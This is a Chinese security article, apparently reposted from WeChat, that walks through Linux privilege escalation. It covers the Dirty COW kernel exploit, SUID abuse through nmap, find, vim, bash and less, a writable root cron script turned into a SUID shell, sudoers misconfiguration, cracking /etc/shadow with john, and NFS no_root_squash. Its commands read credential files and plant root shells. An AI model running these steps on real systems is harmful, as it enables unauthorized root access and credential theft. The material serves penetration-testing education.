> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/RWUHIIkdRIr-YRzDZImq9A)

1、内核漏洞脏牛提权

查看发行版本

```
cat /etc/issue
cat /etc/*-release

```

查看内核版本信息

```
uname -a

```

具体提权

1、信息收集配合 kali 提权

uname -a   # 查看内核版本信息

![](https://mmbiz.qpic.cn/mmbiz_png/3ZX4O1QxGtO8DgGvo5WaQJeg71UTC0DCOlTcS5zUe3pFyCJJgTWGggpX1zhZhicLCXNDPhUUaQaMGkacvYnCUxw/640?wx_fmt=png)

内核版本为 3.2.78，那我们可以搜索该版本漏洞

searchsploit linux 3.2.78

![](https://mmbiz.qpic.cn/mmbiz_png/3ZX4O1QxGtO8DgGvo5WaQJeg71UTC0DCia1Or3SWZibX10WQibrWIXXfof61ynn7FBUHrnvR2sjgMSQdPS4ythAlA/640?wx_fmt=png)

找到几个可以使用的脏牛提权脚本，这里我使用的是 40839.c 脚本

![](https://mmbiz.qpic.cn/mmbiz_png/3ZX4O1QxGtO8DgGvo5WaQJeg71UTC0DCAPkSmHY43bSkN1sxn8vB8H7mZ7bocgfw88DYPLltqibFrzCPhBoLFJw/640?wx_fmt=png)

那我们把这个文件也进行上传

![](https://mmbiz.qpic.cn/mmbiz_png/3ZX4O1QxGtO8DgGvo5WaQJeg71UTC0DC7U3Moicsah0artNneVubSvSa6NVXRn6cWfrXJ95icGxX2yhXwADhrRZA/640?wx_fmt=png)

然后在我们反弹的 shell 上查看，发现上传成功。

![](https://mmbiz.qpic.cn/mmbiz_png/3ZX4O1QxGtO8DgGvo5WaQJeg71UTC0DCP5aFicvjbtJ7kCU2QLaZmFBiajD7CvXHvUs8o6Xnc75mE9P4v1hFYMSw/640?wx_fmt=png)

我们可以先看看脚本

![](https://mmbiz.qpic.cn/mmbiz_png/3ZX4O1QxGtO8DgGvo5WaQJeg71UTC0DCXziaPia4lRIuuNn90SsiczN9nF4UlIG9y1YZcjKuKpbHLY55akRyvyQsw/640?wx_fmt=png)

利用提示对脚本进行编译

gcc -pthread 40839.c -o 40839 -lcrypt

![](https://mmbiz.qpic.cn/mmbiz_png/3ZX4O1QxGtO8DgGvo5WaQJeg71UTC0DCKtKLFliavhHRJQ7PHvjiaTFibIf4OLNAsuVvw5F22QwsM6AIkpAu2yPsg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/3ZX4O1QxGtO8DgGvo5WaQJeg71UTC0DC2I7ZwOYEZyuepNOArG9w6ZJro6w0PsEjU6cendyevXVpM6YibY8ojCg/640?wx_fmt=png)

运行然后输入密码即可

![](https://mmbiz.qpic.cn/mmbiz_png/3ZX4O1QxGtO8DgGvo5WaQJeg71UTC0DCMZibMav0ghg5fh1gOxhrud5iaJNiaUboXq52fDHYDicI6gibSjus3OMswWQ/640?wx_fmt=png)

接下来我们通过

su firefart   # 切换用户

![](https://mmbiz.qpic.cn/mmbiz_png/3ZX4O1QxGtO8DgGvo5WaQJeg71UTC0DCykg89K8yCsmvxcfTMalyWfnnO9foSDc5gibwjezuLW1ubpo7bKunKog/640?wx_fmt=png)

2、利用 linux-exploit-suggester、linux-exploit-suggester-2 等工具

linux-exploit-suggester  

![](https://mmbiz.qpic.cn/mmbiz_png/3ZX4O1QxGtO8DgGvo5WaQJeg71UTC0DCH8eVtFuctFYn2a2I92Wmia0spnFCIKZV4hE9Ly1BkvWD8AwMEfWTurA/640?wx_fmt=png)

linux-exploit-suggester-2

![](https://mmbiz.qpic.cn/mmbiz_png/3ZX4O1QxGtO8DgGvo5WaQJeg71UTC0DCJjkQkcucicibJ2HO1zJTSDEpI5ic2b44UWmlooKnPeFd1o5wz67GQsz0w/640?wx_fmt=png)

2、SUID 配置错误提权

SUID 简介

1. 只有可以执行的二进制程序文件才能设定 SUID 权限, 非二进制文件设置 SUID 权限没任何意义.

2. 命令执行者要对该程序文件拥有执行 (x) 权限.

3. 命令执行者在执行该程序时获得该程序文件属主的身份.

4.SUID 权限只在该程序执行过程中有效, 也就是说身份改变只在程序执行过程中有效

SUID 设置方法

```
1、chmod u+s FILE...
2、chmod u-s FILE…

```

具体提权

SUID 可以让程序调用者以文件拥有者的身份运行该文件，当我们以一个普通用户去运行一个 root 用户所有的 SUID 文件，那么运行该文件我们就可以获取到 root 权限

常见 Linux 中 root 文件列表如下

```
nmap
vim
find
bash
more
less
nano
cp

```

利用如下 POC

```
#以下命令将尝试查找具有root权限的SUID的文件，不同系统适用于不同的命令
find / -perm -u=s -type f 2>/dev/null
find / -user root -perm -4000-print2>/dev/null
find / -user root -perm -4000-exec ls -ldb {} \;

```

![](https://mmbiz.qpic.cn/mmbiz_png/3ZX4O1QxGtO8DgGvo5WaQJeg71UTC0DCLpxtBMibxiaUGb9B948Ov6JkZVd3SuaTp16HtJVwlibGzZqeefumdFTUQ/640?wx_fmt=png)

各命令提权利用

nmap

旧版本的 Nmap（2.02 到 5.21）具有交互模式，允许用户执行 shell 命令。由于 Nmap 位于以 root 权限执行的二进制文件列表中，因此可以使用交互式控制台来运行具有相同权限的 shell。

nmap --interactive #启动交互模式

![](https://mmbiz.qpic.cn/mmbiz_png/3ZX4O1QxGtO8DgGvo5WaQJeg71UTC0DCNIakqicMlED7yZDMt0ao8InRdKum1uttbmzibc1nX6v8HCA1xK0HoEKw/640?wx_fmt=png)

```
nmap> !sh
sh-3.2# whoami
root

```

![](https://mmbiz.qpic.cn/mmbiz_png/3ZX4O1QxGtO8DgGvo5WaQJeg71UTC0DCkqbibjKRsxvMzPuaQlX3COpFtDwyTmLfS0FibkRraibibKb6UpwPMpL9zg/640?wx_fmt=png)

或者有一个 Metasploit 模块，它通过 SUID Nmap 二进制文件执行权限提升。

exploit/unix/local/setuid_nmap

find

实用程序 find 可用于发现存储在系统上。然而，它是执行命令的能力。因此，如果它被配置为使用 SUID 权限运行，那么所有将通过 find 执行的命令都将以 root 身份执行。

我们拿到一个非 root 权限

![](https://mmbiz.qpic.cn/mmbiz_png/3ZX4O1QxGtO8DgGvo5WaQJeg71UTC0DCeQhic8Kvoa8ZyUibEP6u5V3VmJeA3wa525m1IhdCvxzZayMibYcRlchiag/640?wx_fmt=png)

```
touch abc
find abc -exec whoami \;

```

![](https://mmbiz.qpic.cn/mmbiz_png/3ZX4O1QxGtO8DgGvo5WaQJeg71UTC0DCmtibg6k2aSJ8bkA2a6aWfdPomzX9PCfOX3kcBbpEjRCEicqRum1jkzNw/640?wx_fmt=png)

vim

Vim 的主要用途是作为文本编辑器。但是，如果它作为 SUID 运行，它将继承 root 用户的权限，因此它可以读取系统上的所有文件。

vim.tiny /etc/shadow

![](https://mmbiz.qpic.cn/mmbiz_png/3ZX4O1QxGtO8DgGvo5WaQJeg71UTC0DCy86c6910o4tGwZ9kIqeovPHXugxd7qOZHduCsTuvaal7DlgCSN5Ogw/640?wx_fmt=png)

还可以通过 vim 来打开 shell

```
vim.tiny
# Press ESC key
:set shell=/bin/sh
:shell

```

![](https://mmbiz.qpic.cn/mmbiz_png/3ZX4O1QxGtO8DgGvo5WaQJeg71UTC0DCIib7V8lfm4Zvzeh6xFPz66JBsXaXdVlnFqefKDhibzaH0zA97WzTFuWA/640?wx_fmt=png)

Bash

```
bash -p
bash-3.2# id
uid=1002(service) gid=1002(service) euid=0(root) groups=1002(service)

```

![](https://mmbiz.qpic.cn/mmbiz_png/3ZX4O1QxGtO8DgGvo5WaQJeg71UTC0DCZ6VqWdgBmMlkr0AHicW4w2ftJptsfFzVRZkSuuOjfjT4ybvqfrzicLyQ/640?wx_fmt=png)

less 和 more

```
less /etc/passwd
!/bin/sh

```

![](https://mmbiz.qpic.cn/mmbiz_png/3ZX4O1QxGtO8DgGvo5WaQJeg71UTC0DC552bGcAzSl5J6fhmYfxqwicnKk29z6AbUxcfFOMoNSQV4QTtzTVmswA/640?wx_fmt=png)

3、计划任务提权

系统内可能会有一些定时执行的任务，一般这些任务由 crontab 来管理，具有所属用户的权限。非 root 权限的用户是不可以列出 root 用户的计划任务的。但是 / etc / 内系统的计划任务可以被列出。

利用命令如下命令列出一些计划任务

```
ls -l /etc/cron*
cat /etc/crontab

```

![](https://mmbiz.qpic.cn/mmbiz_png/3ZX4O1QxGtO8DgGvo5WaQJeg71UTC0DCAX7rnETEym4INzsKOZwvmvLNSm5ibO3eGiaa2JymMhXL2NrtYvMicMTnQ/640?wx_fmt=png)

在发现有一些计划任务时，我们就可以去检查是否存在一些问题导致权限的提升

权限配置不当

首先我们拿到一个非 root 用户的账号，我们通过一些其他的手段提权都失败了，这个时候我们查看了一下计划任务

cat /etc/crontab

![](https://mmbiz.qpic.cn/mmbiz_png/3ZX4O1QxGtO8DgGvo5WaQJeg71UTC0DCVDhFfsMUzU5CGq2GcHkUHWe6mWFpLZAOmnzPaFYE8JzQVviaXeqsAqw/640?wx_fmt=png)

发现存在一个 root 身份运行的 test.sh，那我们当相应的目录下去查看一下这个计划任务

cd /sbin;ls -l test.sh

![](https://mmbiz.qpic.cn/mmbiz_png/3ZX4O1QxGtO8DgGvo5WaQJeg71UTC0DCmtePM4dBL7fwoZb4M8vc7rAvWBWd62rzYnqEVVks35iclXOc7jQGpZA/640?wx_fmt=png)

发现这里权限配置为 777，就是说我们普通用户也能去修改这个 test.sh 文件，那我们对文件进行修改，然后进行提权。

```
cp /bin/bash /tmp/bash; chmod u+s /tmp/bash;

```

![](https://mmbiz.qpic.cn/mmbiz_png/3ZX4O1QxGtO8DgGvo5WaQJeg71UTC0DCSH3FxPA7WhGOPibHtQdjIaibtic7zFONY9bTdicfoDbJYFT1kUhKvQJHfQ/640?wx_fmt=png)

接下来就到 /tmp 等待计划任务的执行

![](https://mmbiz.qpic.cn/mmbiz_png/3ZX4O1QxGtO8DgGvo5WaQJeg71UTC0DCwdiaPNjVYL9Oa8KQBEr3aDaeHPT7ySyofVu6LNI2xjelNCj0A3ay4xg/640?wx_fmt=png)

产生后对 bash 文件进行执行即可进行提权

![](https://mmbiz.qpic.cn/mmbiz_png/3ZX4O1QxGtO8DgGvo5WaQJeg71UTC0DCb81Koma9S9h7elafrTvY4MXBIWGPWNHvzdRgprjktWH8p4xDGdwdibA/640?wx_fmt=png)

4、sudo 提权

普通用户一般是无法运行 root 所有者的命令的，运用 sudo 可以使普通用户使用 root 用户的命令。但是在一些场景下，管理员为了平常运营方便给 sudoer 文件配置不当，从而导致权限提升的问题产生。

一般情况下，我们使用 sudo 命令都需要输入 root 密码

![](https://mmbiz.qpic.cn/mmbiz_png/3ZX4O1QxGtO8DgGvo5WaQJeg71UTC0DCObolU6KazrLias0u0e7L8WhbPpbpJImCghnK5bzMsuykKXZtmqQu2eA/640?wx_fmt=png)

管理可能为了方便对 / etc/sudoers 进行编辑成 sudo 免密码

vim /etc/sudoers

```
添加：test ALL=(ALL:ALL) NOPASSWD:ALL  #test为我们的用户

```

![](https://mmbiz.qpic.cn/mmbiz_png/3ZX4O1QxGtO8DgGvo5WaQJeg71UTC0DCQzAiaE7TBR7Ob7q704eVtvsGED6cJ2G5iaXkuEuueTiasExmxqejttYGg/640?wx_fmt=png)

添加后我们在进行重新进行读取

![](https://mmbiz.qpic.cn/mmbiz_png/3ZX4O1QxGtO8DgGvo5WaQJeg71UTC0DCBlCTAt7Fry7Tia09TTbrbB2xT5cQwIrd2tE7NlTIvZ4yIfORlSDpeiaA/640?wx_fmt=png)

5、明文 root 密码提权

大多数 linux 系统的密码都和 / etc/passwd 和 / etc/shadow 这两个配置文件息息相关。passwd 里面储存了用户，shadow 里面是密码的 hash。出于安全考虑 passwd 是全用户可读，root 可写的。shadow 是仅 root 可读写的。

![](https://mmbiz.qpic.cn/mmbiz_png/3ZX4O1QxGtO8DgGvo5WaQJeg71UTC0DCeVSN4RoT2motdZad89Nv037uy9hCYEUBibaC0cnZsKXyjibMibO9RPgfg/640?wx_fmt=png)

当我们的 passwd 和 shadow 一些权限配置不当就可能会导致提权

passwd 文件

```
test:x:1000:1000::/home/test:/bin/bash 

```

passwd 由冒号分割，第一列是用户名，第二列是密码，x 代表密码 hash 被放在 shadow 里面了（非 root 用户不可读）。

当我们的 passwd 文件给普通用户配置了写权限，那么我们就可以通过修改 x 为一段已知的密码的 hash 值来进行提权。

shadow 文件

```
test:$6$Mqh9T8ip$4Ev.HJTBdyobrYaW/KzBlL0yx6wefeB.VDcE7KiDiwoUvGkqShU9jRK4cEZA2kBRsyH2fWjmbxc/ZyVWfXwFJ/:18849:0:99999:7:::

```

假如我们对 shadow 文件有读取权限我们就可以利用 hash、john 等对其进行爆破

这里以 john 为例进行演示，首先把 passwd 和 shadow 两文件放在同一文件下

![](https://mmbiz.qpic.cn/mmbiz_png/3ZX4O1QxGtO8DgGvo5WaQJeg71UTC0DCdkyX9V7o8faAdOmPgLaAgRPhdLyD4RHCCHG2VusicxCT5qMWqcYQAZQ/640?wx_fmt=png)

```
john --user=test test.hash

```

![](https://mmbiz.qpic.cn/mmbiz_png/3ZX4O1QxGtO8DgGvo5WaQJeg71UTC0DCq3pXezlrh8oL18OU7ov6bCDuHqCXeCicyjJHxQ4joCriax8ZdlU3Pesw/640?wx_fmt=png)

6、密码复用提权

当我们获取到一些如数据库、后台 web 密码，可能就是 root 密码

7、第三方服务提权

netstat -antup #查看各种网络服务

1、NFS 提权

当服务器中存在 NFS 共享，且开启了 no_root_squash 选项时，这时如果客户端使用的是 root 用户，那么对于共享目录来说，该客户端就有 root 权限，可以使用它来提升权限。

①查看 NFS 服务器上的共享目录

sudo showmount -e x.x.x.x

②创建本地挂载目录，挂载共享目录。使用攻击者本地 root 权限创建 Suid shell。

sudo mkdir -p /tmp

sudo mount -t nfs x.x.x.x:/home/test /tmp

cp /bin/bash /tmp/shell

chmod u+s /tmp/shell

③回到要提权的服务器上，使用普通用户使用 shell -p 来获取 root 权限。

2、数据库提权（篇幅教长，后续另起篇幅）

①UDF 提权

②MOF 提权

③启动项提权

④CVE-2016-6663、CVE-2016-6664 组合提权

⑤反弹端口提权

注：如有侵权请后台联系进行删除

觉得内容不错, 请点一下 "赞" 和 "在看"

  

![图片](https://mmbiz.qpic.cn/mmbiz_gif/CicIXicDugvT0be94SBX2Xjicc7EQWqUEIsjjfGf3EnLcpxDEhnnIsHAk8iamibYenPbtqFc5agDKicPYCaM2baH7AIA/640?wx_fmt=gif)

**点击上方公众号**

![图片](https://mmbiz.qpic.cn/mmbiz_png/CicIXicDugvT0be94SBX2Xjicc7EQWqUEIsDMibNVAOW0RFtdicgdRFicOovq6LRTaWA43ibOQicbA03vPrEDTtgsoZRPg/640?wx_fmt=png)

**关注我们**

![图片](https://mmbiz.qpic.cn/mmbiz_gif/CicIXicDugvT0be94SBX2Xjicc7EQWqUEIsjjfGf3EnLcpxDEhnnIsHAk8iamibYenPbtqFc5agDKicPYCaM2baH7AIA/640?wx_fmt=gif)

往期精彩

[(紧急版本)Searchall3.5.2 敏感信息搜索工具](http://mp.weixin.qq.com/s?__biz=MzIzMjg0MjM5OQ==&mid=2247485557&idx=1&sn=4888292e73ee6420758b2763917a212c&chksm=e88ffd85dff87493c37c09c13e3f301a91b2f0ceee122edaeddb99d20fa6468949cc5c1386f6&scene=21#wechat_redirect)  

[信息收集的方法 (三)](http://mp.weixin.qq.com/s?__biz=MzIzMjg0MjM5OQ==&mid=2247485300&idx=1&sn=23a8b9996f081c0839a33b265cd331c6&chksm=e88ff284dff87b92ef28895da9d72ed3b8f5dc8d2c895f3fb1f92e700c042cf351ed113cddd3&scene=21#wechat_redirect)  

[常见的 web 框架特征 (二)](http://mp.weixin.qq.com/s?__biz=MzIzMjg0MjM5OQ==&mid=2247485154&idx=1&sn=87fa07e79dce76afb638dbb623d3635d&chksm=e88ff312dff87a04fc3ef339cff2ee50e3793ba816cbe4fd491ccc91861c0203be3903ed5da0&scene=21#wechat_redirect)  

  

  

  

  

  

1、公众号后台回复：搜索大法，获取 searchall 工具下载链接。

2、公众号后台回复：靶场，获取靶场工具网盘下载链接。

3、公众号后台回复：webshell，获取 webshell 下载链接。

3、公众号后台回复：验证码，获取验证码工具下载链接。